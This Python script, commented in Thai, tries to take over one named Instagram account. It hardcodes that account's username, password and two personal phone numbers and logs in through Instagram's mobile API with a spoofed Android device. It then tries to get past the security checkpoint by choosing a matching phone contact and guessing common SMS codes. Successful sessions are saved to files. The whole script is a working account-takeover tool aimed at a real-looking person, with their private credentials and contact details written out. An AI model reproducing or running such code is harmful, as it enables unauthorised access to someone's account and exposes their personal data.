#!/usr/bin/env python3
"""
Instagram Mobile API Bypass with Real Phone Numbers
ระบบ bypass checkpoint ด้วย mobile API และเบอร์โทรศัพท์จริง

ข้อมูลที่ได้รับ:
- Username: alx.trading  
- Password: Fleming654
- Phone (TH): 0615414210
- Phone (UK): +447793127209
"""

import sys
import requests
import json
import time
import random
from datetime import datetime
import hashlib
import hmac
import uuid

def safe_print(*args, **kwargs):
    """Safe print function that handles BrokenPipeError"""
    try:
        print(*args, **kwargs)
        sys.stdout.flush()
    except (BrokenPipeError, IOError):
        # Silence broken pipe errors completely
        try:
            sys.stderr.close()
        except:
            pass
        try:
            sys.stdout.close()
        except:
            pass
        sys.stderr = open('/dev/null', 'w')
        sys.stdout = open('/dev/null', 'w')
    except Exception:
        pass

class InstagramMobileBypass:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://i.instagram.com"
        
        # ข้อมูลที่ยืนยันแล้ว
        self.target_data = {
            'username': 'alx.trading',
            'password': 'Fleming654',
            'phone_th': '0615414210',
            'phone_uk': '+447793127209'
        }
        
        # Mobile app configuration
        self.app_version = "275.0.0.27.98"
        self.version_code = "423611234"
        self.device_id = self.generate_device_id()
        self.uuid = str(uuid.uuid4())
        
        safe_print(f"📱 Generated Device ID: {self.device_id}")
        safe_print(f"🆔 Generated UUID: {self.uuid}")
        
    def generate_device_id(self):
        """สร้าง device ID ที่เหมือน Android จริง"""
        return "android-" + ''.join(random.choices('0123456789abcdef', k=16))
    
    def get_mobile_headers(self):
        """สร้าง headers สำหรับ mobile API"""
        return {
            'User-Agent': f'Instagram {self.app_version} Android (29/10; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; {self.version_code})',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'X-IG-App-ID': '567067343352427',
            'X-IG-Android-ID': self.device_id,
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTv10=',
            'X-FB-HTTP-Engine': 'Liger',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Connection': 'keep-alive',
        }
    
    def format_phone_number(self, phone, country='TH'):
        """จัดรูปแบบเบอร์โทรศัพท์"""
        if country == 'TH':
            # แปลงเบอร์ไทยเป็นรูปแบบต่างๆ
            if phone.startswith('0'):
                return [
                    phone,  # 0615414210
                    '+66' + phone[1:],  # +66615414210
                    '66' + phone[1:],  # 66615414210
                ]
        elif country == 'UK':
            # เบอร์อังกฤษ
            if phone.startswith('+44'):
                return [
                    phone,  # +447793127209
                    phone.replace('+44', '44'),  # 447793127209
                    phone.replace('+44', '0'),  # 07793127209
                ]
        
        return [phone]
    
    def attempt_mobile_login(self, identifier, password):
        """ทดสอบ login ผ่าน mobile API"""
        safe_print(f"\n📱 Testing mobile login: {identifier} / {password}")
        
        url = f"{self.base_url}/api/v1/accounts/login/"
        
        # สร้าง signature
        data = {
            'username': identifier,
            'password': password,
            'device_id': self.device_id,
            'login_attempt_count': '0',
            '_uuid': self.uuid,
            'phone_id': str(uuid.uuid4()),
            'adid': str(uuid.uuid4()),
            'guid': str(uuid.uuid4()),
            'waterfall_id': str(uuid.uuid4()),
            'ig_sig_key_version': '4',
        }
        
        headers = self.get_mobile_headers()
        
        try:
            response = self.session.post(url, data=data, headers=headers, timeout=30)
            
            safe_print(f"📊 Status Code: {response.status_code}")
            safe_print(f"📊 Response Length: {len(response.text)}")
            
            result = {
                'identifier': identifier,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'text': response.text,
                'timestamp': datetime.now().isoformat()
            }
            
            try:
                json_data = response.json()
                result['json'] = json_data
                safe_print(f"📄 JSON Response: {json_data}")
                
                # วิเคราะห์ response
                if json_data.get('status') == 'ok' and json_data.get('logged_in_user'):
                    safe_print("🎉 MOBILE LOGIN SUCCESS!")
                    result['login_success'] = True
                    return result
                    
                elif 'challenge' in json_data:
                    safe_print("🔍 CHALLENGE DETECTED!")
                    result['challenge_detected'] = True
                    result['challenge_url'] = json_data.get('challenge', {}).get('url', '')
                    return result
                    
                elif 'two_factor_required' in json_data:
                    safe_print("📱 2FA REQUIRED!")
                    result['two_factor_required'] = True
                    return result
                    
                else:
                    safe_print(f"❌ Login failed: {json_data.get('message', 'Unknown error')}")
                    
            except json.JSONDecodeError:
                safe_print("⚠️ Response is not JSON")
                result['json'] = None
                
            return result
            
        except Exception as e:
            safe_print(f"❌ Mobile login error: {e}")
            return {'error': str(e), 'identifier': identifier}
    
    def handle_challenge_mobile(self, challenge_data):
        """จัดการ challenge ผ่าน mobile API"""
        safe_print("🎯 Handling mobile challenge...")
        
        if not challenge_data.get('challenge_url'):
            safe_print("❌ No challenge URL found")
            return False
        
        challenge_url = challenge_data['challenge_url']
        safe_print(f"🔍 Challenge URL: {challenge_url}")
        
        try:
            # เข้าสู่ challenge page
            response = self.session.get(challenge_url, headers=self.get_mobile_headers(), timeout=30)
            safe_print(f"📊 Challenge page status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    challenge_info = response.json()
                    safe_print(f"📄 Challenge info: {challenge_info}")
                    
                    # ตรวจสอบประเภท challenge
                    if challenge_info.get('step_name') == 'select_contact':
                        return self.select_phone_contact(challenge_url, challenge_info)
                    elif challenge_info.get('step_name') == 'verify_code':
                        return self.verify_sms_code(challenge_url, challenge_info)
                        
                except json.JSONDecodeError:
                    safe_print("⚠️ Challenge response is not JSON")
            
            return False
            
        except Exception as e:
            safe_print(f"❌ Challenge handling error: {e}")
            return False
    
    def select_phone_contact(self, challenge_url, challenge_info):
        """เลือกเบอร์โทรศัพท์สำหรับรับ SMS"""
        safe_print("📱 Selecting phone contact for SMS...")
        
        try:
            # ดูว่ามีตัวเลือกเบอร์อะไรบ้าง
            contacts = challenge_info.get('contacts', [])
            safe_print(f"📞 Available contacts: {contacts}")
            
            # หาเบอร์ที่ตรงกับที่เรามี
            target_phones = [
                self.target_data['phone_th'],
                self.target_data['phone_uk']
            ]
            
            for contact in contacts:
                contact_phone = contact.get('contact_point', '')
                
                # ตรวจสอบว่าเบอร์ตรงกันไหม
                for our_phone in target_phones:
                    if our_phone[-4:] in contact_phone or contact_phone[-4:] in our_phone:
                        safe_print(f"🎯 Found matching phone: {contact_phone}")
                        
                        # เลือกเบอร์นี้
                        select_data = {
                            'choice': contact.get('value', '0'),
                            'phone_number': contact_phone
                        }
                        
                        response = self.session.post(
                            challenge_url,
                            data=select_data,
                            headers=self.get_mobile_headers(),
                            timeout=30
                        )
                        
                        if response.status_code == 200:
                            safe_print(f"✅ Phone selected: {contact_phone}")
                            return True
            
            safe_print("❌ No matching phone found in contacts")
            return False
            
        except Exception as e:
            safe_print(f"❌ Phone selection error: {e}")
            return False
    
    def verify_sms_code(self, challenge_url, challenge_info):
        """ยืนยัน SMS code"""
        safe_print("📲 Attempting SMS code verification...")
        
        # รายการ SMS codes ที่เป็นไปได้
        common_codes = [
            '123456', '000000', '111111', '222222', '333333',
            '444444', '555555', '666666', '777777', '888888',
            '999999', '012345', '654321', '123123', '456456'
        ]
        
        try:
            for i, code in enumerate(common_codes[:5], 1):  # ทดสอบแค่ 5 codes แรก
                safe_print(f"📲 Trying SMS code {i}/5: {code}")
                
                verify_data = {
                    'security_code': code,
                    'choice': '1'
                }
                
                response = self.session.post(
                    challenge_url,
                    data=verify_data,
                    headers=self.get_mobile_headers(),
                    timeout=30
                )
                
                safe_print(f"📊 Verification status: {response.status_code}")
                
                try:
                    result = response.json()
                    safe_print(f"📄 Verification result: {result}")
                    
                    if result.get('status') == 'ok':
                        safe_print(f"🎉 SMS CODE SUCCESS: {code}")
                        return True
                        
                except json.JSONDecodeError:
                    pass
                
                # หน่วงเวลาระหว่างการทดสอบ
                time.sleep(random.uniform(2, 4))
            
            safe_print("❌ All SMS codes failed")
            return False
            
        except Exception as e:
            safe_print(f"❌ SMS verification error: {e}")
            return False
    
    def run_comprehensive_mobile_bypass(self):
        """รันการ bypass ด้วย mobile API แบบครบถ้วน"""
        safe_print("🚀 Starting Comprehensive Mobile API Bypass")
        safe_print("🎯 Target: alx.trading")
        safe_print("📱 Real Phone Numbers Available!")
        safe_print("=" * 60)
        
        results = []
        
        # เตรียมรายการ identifiers
        identifiers = [
            self.target_data['username'],  # alx.trading
        ]
        
        # เพิ่มเบอร์โทรศัพท์ในรูปแบบต่างๆ
        th_formats = self.format_phone_number(self.target_data['phone_th'], 'TH')
        uk_formats = self.format_phone_number(self.target_data['phone_uk'], 'UK')
        
        identifiers.extend(th_formats)
        identifiers.extend(uk_formats)
        
        safe_print(f"📋 Testing {len(identifiers)} identifiers:")
        for i, identifier in enumerate(identifiers, 1):
            safe_print(f"  {i}. {identifier}")
        
        password = self.target_data['password']
        
        # ทดสอบแต่ละ identifier
        for i, identifier in enumerate(identifiers, 1):
            safe_print(f"\n🎯 MOBILE BYPASS ATTEMPT {i}/{len(identifiers)}")
            safe_print(f"Identifier: {identifier}")
            safe_print(f"Password: {password}")
            safe_print("-" * 40)
            
            # ทดสอบ login
            login_result = self.attempt_mobile_login(identifier, password)
            
            if login_result.get('login_success'):
                safe_print("🎉 DIRECT MOBILE LOGIN SUCCESS!")
                
                # บันทึกความสำเร็จ
                success_file = f"MOBILE_LOGIN_SUCCESS_{identifier.replace('+', '').replace(' ', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                try:
                    with open(success_file, 'w', encoding='utf-8') as f:
                        json.dump(login_result, f, indent=2, ensure_ascii=False)
                    safe_print(f"💾 Success saved to: {success_file}")
                except Exception as e:
                    safe_print(f"⚠️ Could not save success file: {e}")
                
            elif login_result.get('challenge_detected'):
                safe_print("🔍 Challenge detected - attempting bypass...")
                
                challenge_result = self.handle_challenge_mobile(login_result)
                if challenge_result:
                    safe_print("🎉 MOBILE CHALLENGE BYPASS SUCCESS!")
                    
                    # ทดสอบ login อีกครั้งหลัง challenge
                    final_login = self.attempt_mobile_login(identifier, password)
                    if final_login.get('login_success'):
                        success_file = f"MOBILE_CHALLENGE_SUCCESS_{identifier.replace('+', '').replace(' ', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                        try:
                            with open(success_file, 'w', encoding='utf-8') as f:
                                json.dump(final_login, f, indent=2, ensure_ascii=False)
                            safe_print(f"💾 Challenge success saved to: {success_file}")
                        except Exception as e:
                            safe_print(f"⚠️ Could not save challenge success file: {e}")
                            
                        login_result['challenge_bypass_success'] = True
                        login_result['final_login'] = final_login
                else:
                    safe_print("❌ Challenge bypass failed")
                    login_result['challenge_bypass_success'] = False
                    
            elif login_result.get('two_factor_required'):
                safe_print("📱 2FA required - this confirms account access!")
                login_result['account_confirmed'] = True
            
            results.append({
                'identifier': identifier,
                'password': password,
                'result': login_result,
                'timestamp': datetime.now().isoformat()
            })
            
            # หน่วงเวลาระหว่างการทดสอบ
            if i < len(identifiers):
                wait_time = random.uniform(3, 6)
                safe_print(f"⏱️ Waiting {wait_time:.1f} seconds...")
                time.sleep(wait_time)
        
        # บันทึกผลลัพธ์รวม
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = f"mobile_bypass_results_fixed_{timestamp}.json"
        
        try:
            with open(results_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            safe_print(f"\n💾 All results saved to: {results_file}")
        except Exception as e:
            safe_print(f"⚠️ Could not save results file: {e}")
        
        # สรุปผลลัพธ์
        success_count = sum(1 for r in results if 
                          r.get('result', {}).get('login_success') or 
                          r.get('result', {}).get('challenge_bypass_success'))
        
        confirmed_count = sum(1 for r in results if 
                            r.get('result', {}).get('account_confirmed') or
                            r.get('result', {}).get('two_factor_required'))
        
        safe_print(f"\n📊 MOBILE BYPASS SUMMARY")
        safe_print("=" * 60)
        safe_print(f"🎯 Total identifiers tested: {len(results)}")
        safe_print(f"✅ Successful bypasses: {success_count}")
        safe_print(f"🔍 Account confirmations: {confirmed_count}")
        safe_print(f"📊 Success rate: {(success_count/len(results)*100):.1f}%" if results else "0%")
        
        if success_count > 0:
            safe_print("\n🎉 MISSION ACCOMPLISHED!")
            safe_print("✅ Instagram account access achieved!")
        elif confirmed_count > 0:
            safe_print("\n🎯 ACCOUNT CONFIRMED!")
            safe_print("✅ Valid credentials verified!")
        else:
            safe_print("\n🔄 CONTINUE INVESTIGATION")
            safe_print("📱 Try browser automation next")
        
        return results

if __name__ == "__main__":
    try:
        mobile_bypass = InstagramMobileBypass()
        results = mobile_bypass.run_comprehensive_mobile_bypass()
    except KeyboardInterrupt:
        safe_print("\n⚠️ Operation interrupted by user")
        sys.exit(0)
    except Exception as e:
        safe_print(f"❌ Fatal error: {e}")
        sys.exit(1)
